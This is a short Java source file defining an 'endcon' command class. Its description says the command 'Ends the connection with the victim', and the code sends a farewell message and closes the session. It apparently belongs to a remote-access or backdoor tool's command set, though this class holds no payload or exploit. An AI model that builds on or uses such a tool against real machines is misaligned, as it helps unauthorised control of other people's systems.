package commands;

import java.io.IOException;

import control.Controller;

public class EndCommand extends Command{

	public EndCommand() {
		super("endcon", null, "Ends the connection with the victim");
	}

	@Override
	public void execute(Controller ctrl) throws IOException {
		ctrl.sendMsg("Bye :(\n\n");
		ctrl.endConnection();
	}
}
